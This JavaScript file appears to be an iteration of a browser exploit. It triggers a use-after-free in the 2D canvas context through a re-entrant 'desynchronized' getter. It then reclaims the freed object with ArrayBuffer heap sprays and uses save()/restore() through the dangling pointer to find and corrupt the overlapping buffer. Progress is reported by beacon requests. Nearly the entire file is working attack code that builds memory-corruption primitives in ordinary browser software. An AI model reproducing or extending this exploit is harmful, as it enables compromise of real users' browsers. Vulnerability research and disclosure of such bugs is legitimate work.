// p487 — Canvas UAF: AB spray into freed slot + save() marker identification
//
// GC-SAFE BREAKTHROUGH: visitAdditionalChildren only passes m_canvas (offset +32)
// to addOpaqueRoot as a HashSet key — NEVER dereferences it. AB spray is safe.
//
// V483 real crash: AB zero-fills m_stateStack → m_size=0 → at(SIZE_MAX) → CrashOnOverflow
// V484 real crash: XHR beacon between UAF and read allocated into freed 768B slot
//
// V487 approach:
//   Phase 1: Canvas UAF + same-type spray → confirm aliasing
//   Phase 2: Free aliased context + AB spray (768B)
//   Phase 3: save() marker scan to identify target AB
//   NO lineWidth reads (m_stateStack is zero → CrashOnOverflow)
//
// Beacon prefix: V487-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var bQ = [];

  function Q(tag, body) { bQ.push([tag, body || '']); }
  function flushBeacons() {
    for (var i = 0; i < bQ.length; i++) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', BASE + '/beacon/V487-' + bQ[i][0], false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send('[' + (Date.now() - T0) + 'ms] ' + bQ[i][1]);
      } catch(e) {}
    }
    bQ = [];
  }

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V487-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Canvas UAF + Same-Type Spray (proven V482 baseline)
  // ═══════════════════════════════════════════════════════════
  var dCtx1 = null, lCtx1 = null;
  var tc1 = document.createElement('canvas');
  tc1.width = 10; tc1.height = 10;
  document.body.appendChild(tc1);

  var cc1 = 0, s1 = {};
  Object.defineProperty(s1, 'desynchronized', {
    get: function() { cc1++; if (cc1 === 1) dCtx1 = tc1.getContext('2d'); return false; }
  });
  lCtx1 = tc1.getContext('2d', s1);

  if (!dCtx1) { B('ABORT', 'uaf1-fail'); return; }

  // Same-type spray: 200 contexts with lineWidth = 500+i
  var sprayC = [], sprayX = [];
  for (var i = 0; i < 200; i++) {
    var c = document.createElement('canvas');
    c.width = 10; c.height = 10;
    sprayC.push(c);
    var ctx = c.getContext('2d');
    ctx.lineWidth = 500 + i;
    sprayX.push(ctx);
  }

  // Read lineWidth through dangling pointer — should match spray[idx]
  var lw1 = dCtx1.lineWidth;
  if (typeof lw1 !== 'number' || lw1 < 500 || lw1 >= 700) {
    B('UAF1-MISS', 'lw=' + lw1);
    return;
  }
  var idx1 = Math.round(lw1 - 500);
  B('UAF1-ALIAS', 'idx=' + idx1);

  // Verify bidirectional alias
  sprayX[idx1].lineWidth = 777.25;
  var bidir = dCtx1.lineWidth;
  if (bidir !== 777.25) {
    B('BIDIR-FAIL', 'wrote=777.25,read=' + bidir);
    return;
  }
  B('BIDIR-OK', 'idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Free the aliased context + spray ArrayBuffers
  //
  // Strategy: null out spray[idx1] references, force GC,
  // then spray 768-byte ABs to reclaim the freed slot.
  //
  // GC-SAFE: addOpaqueRoot reads m_canvas at +32 but only
  // uses it as HashSet key (never dereferences). AB data at
  // +32 can be any non-null 8-byte value.
  // ═══════════════════════════════════════════════════════════

  // Save ref to the aliased canvas element and context
  var aliasedCanvas = sprayC[idx1];
  var aliasedCtx = sprayX[idx1];

  // Null out the spray slot
  sprayC[idx1] = null;
  sprayX[idx1] = null;

  // Remove the canvas from DOM (breaks the Document→Canvas→Context ref chain)
  if (aliasedCanvas.parentNode) aliasedCanvas.parentNode.removeChild(aliasedCanvas);

  // Clear our references too
  aliasedCanvas = null;
  aliasedCtx = null;

  // Force GC — create and discard many objects
  // dCtx1 still holds a dangling JSWrapper→freed C++ slot
  var gcJunk = [];
  for (var g = 0; g < 5000; g++) {
    gcJunk.push({a: new ArrayBuffer(64), b: [g, g+1, g+2]});
  }
  gcJunk = null;

  // Second GC pressure round
  var gcJunk2 = [];
  for (var g = 0; g < 5000; g++) {
    gcJunk2.push(new Float64Array(16));
  }
  gcJunk2 = null;

  Q('GC-DONE', 'freed-idx=' + idx1);

  // ═══════════════════════════════════════════════════════════
  // Spray 768-byte ArrayBuffers
  // Write non-null at offset 32 (m_canvas hash key for GC)
  // ═══════════════════════════════════════════════════════════
  var NUM_ABS = 500;
  var abSpray = [];
  var abViews = [];
  for (var i = 0; i < NUM_ABS; i++) {
    var ab = new ArrayBuffer(768);
    var view = new DataView(ab);
    // Write non-null at offset 32 so GC addOpaqueRoot doesn't skip it
    view.setFloat64(32, 1.5, true);
    abSpray.push(ab);
    abViews.push(view);
  }

  Q('AB-SPRAY', 'count=' + NUM_ABS);

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: save() marker scan
  //
  // m_unrealizedSaveCount is at offset ~592 in the 768B object.
  // save() increments it (no other side effects when count goes 0→1).
  // Scan all AB views at several candidate offsets around 592.
  //
  // Before save(): all ABs should have 0 at those offsets
  // After save(): exactly ONE AB should have 1 at the marker offset
  // ═══════════════════════════════════════════════════════════

  // Candidate offsets for m_unrealizedSaveCount (uint32 or size_t)
  // We try a range around 592 to find the exact offset
  var CANDIDATE_OFFSETS = [
    584, 586, 588, 590, 592, 594, 596, 598,
    600, 602, 604, 606, 608, 610, 612, 614, 616,
    // Also try wider range in case layout differs
    560, 564, 568, 572, 576, 580,
    620, 624, 628, 632, 636, 640, 644, 648
  ];

  // Pre-scan: record byte values at candidate offsets (should all be 0 or our fill value)
  var preScan = {};
  for (var oi = 0; oi < CANDIDATE_OFFSETS.length; oi++) {
    var off = CANDIDATE_OFFSETS[oi];
    var nonZeroCount = 0;
    for (var ai = 0; ai < NUM_ABS; ai++) {
      var val = abViews[ai].getUint32(off, true);
      if (val !== 0) nonZeroCount++;
    }
    if (nonZeroCount > 0) preScan[off] = nonZeroCount;
  }

  Q('PRE-SCAN', 'nonzero=' + JSON.stringify(preScan));

  // ─── CRITICAL: save() call through dangling pointer ───
  // This writes to m_unrealizedSaveCount in the freed (now AB-occupied) slot.
  // If an AB reclaimed the slot, one AB's backing store now has a 1 at the marker offset.
  //
  // save() when m_unrealizedSaveCount is 0: just increments to 1. No stateStack access.
  // This is SAFE because it doesn't read m_stateStack (no Vector::at call).
  var saveOk = false;
  var saveErr = '';
  try {
    dCtx1.save();
    saveOk = true;
  } catch(e) {
    saveErr = e.message || String(e);
  }

  Q('SAVE-CALL', 'ok=' + saveOk + (saveErr ? ',err=' + saveErr : ''));

  if (!saveOk) {
    flushBeacons();
    return;
  }

  // Post-scan: find which AB changed
  var targetIdx = -1;
  var targetOffset = -1;
  var hitCount = 0;
  var hitDetails = [];

  for (var oi = 0; oi < CANDIDATE_OFFSETS.length; oi++) {
    var off = CANDIDATE_OFFSETS[oi];
    for (var ai = 0; ai < NUM_ABS; ai++) {
      var val = abViews[ai].getUint32(off, true);
      if (val === 1) {
        // Check if this was zero before (not our fill pattern)
        // Offset 32 has our 1.5 fill — skip it
        if (off === 32) continue;
        hitCount++;
        hitDetails.push('ab=' + ai + ',off=' + off);
        if (targetIdx === -1) {
          targetIdx = ai;
          targetOffset = off;
        }
      }
    }
  }

  Q('POST-SCAN', 'hits=' + hitCount + ',target=' + targetIdx + ',off=' + targetOffset);
  if (hitDetails.length > 0 && hitDetails.length <= 20) {
    Q('SCAN-DETAIL', hitDetails.join(';'));
  } else if (hitDetails.length > 20) {
    Q('SCAN-DETAIL', hitDetails.slice(0, 20).join(';') + '...+' + (hitDetails.length - 20));
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 4: If target found, do a second save+scan to double-confirm
  // save() again → m_unrealizedSaveCount should go from 1 to 2
  // ═══════════════════════════════════════════════════════════
  if (targetIdx >= 0) {
    try {
      dCtx1.save();
      var val2 = abViews[targetIdx].getUint32(targetOffset, true);
      Q('SAVE2-CONFIRM', 'val=' + val2 + ',expected=2,match=' + (val2 === 2));
    } catch(e) {
      Q('SAVE2-ERR', e.message || String(e));
    }

    // Dump first 128 bytes of target AB as hex for layout analysis
    try {
      var hexParts = [];
      var tView = abViews[targetIdx];
      for (var h = 0; h < 128; h += 8) {
        var lo = tView.getUint32(h, true);
        var hi = tView.getUint32(h + 4, true);
        var hex = ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8);
        hexParts.push(h + ':' + hex);
      }
      Q('TARGET-DUMP-0', hexParts.slice(0, 8).join(','));
      Q('TARGET-DUMP-1', hexParts.slice(8, 16).join(','));
    } catch(e) {
      Q('TARGET-DUMP-ERR', e.message || String(e));
    }

    // Dump bytes around the marker offset
    try {
      var markerHex = [];
      var tView = abViews[targetIdx];
      var start = Math.max(0, targetOffset - 16);
      var end = Math.min(768, targetOffset + 32);
      for (var h = start; h < end; h += 4) {
        markerHex.push(h + ':' + ('00000000' + tView.getUint32(h, true).toString(16)).slice(-8));
      }
      Q('MARKER-REGION', markerHex.join(','));
    } catch(e) {
      Q('MARKER-REGION-ERR', e.message || String(e));
    }

    // Phase 4b: Try restore() to decrement back
    try {
      dCtx1.restore();
      var val3 = abViews[targetIdx].getUint32(targetOffset, true);
      Q('RESTORE-CHECK', 'val=' + val3 + ',expected=1');

      dCtx1.restore();
      var val4 = abViews[targetIdx].getUint32(targetOffset, true);
      Q('RESTORE2-CHECK', 'val=' + val4 + ',expected=0');
    } catch(e) {
      Q('RESTORE-ERR', e.message || String(e));
    }

    // Phase 4c: Write a known value into target AB at the marker offset,
    // then call save() and see if it increments our written value
    try {
      abViews[targetIdx].setUint32(targetOffset, 42, true);
      dCtx1.save();
      var val5 = abViews[targetIdx].getUint32(targetOffset, true);
      Q('WRITE-INC', 'wrote=42,afterSave=' + val5 + ',expected=43,match=' + (val5 === 43));
    } catch(e) {
      Q('WRITE-INC-ERR', e.message || String(e));
    }
  } else {
    Q('TARGET-MISS', 'no AB found with save marker');

    // Wider scan: check ALL uint32 positions in first few ABs
    try {
      var wideHits = [];
      var scanCount = Math.min(50, NUM_ABS);
      for (var ai = 0; ai < scanCount; ai++) {
        for (var off = 0; off < 768; off += 4) {
          if (off === 32) continue; // skip our fill
          var val = abViews[ai].getUint32(off, true);
          if (val !== 0) {
            wideHits.push('ab=' + ai + ',off=' + off + ',val=' + val);
            if (wideHits.length >= 30) break;
          }
        }
        if (wideHits.length >= 30) break;
      }
      Q('WIDE-SCAN', 'hits=' + wideHits.length + ':' + wideHits.slice(0, 15).join(';'));
    } catch(e) {
      Q('WIDE-SCAN-ERR', e.message || String(e));
    }
  }

  Q('DONE', 'target=' + targetIdx + ',off=' + targetOffset);

  flushBeacons();
})();
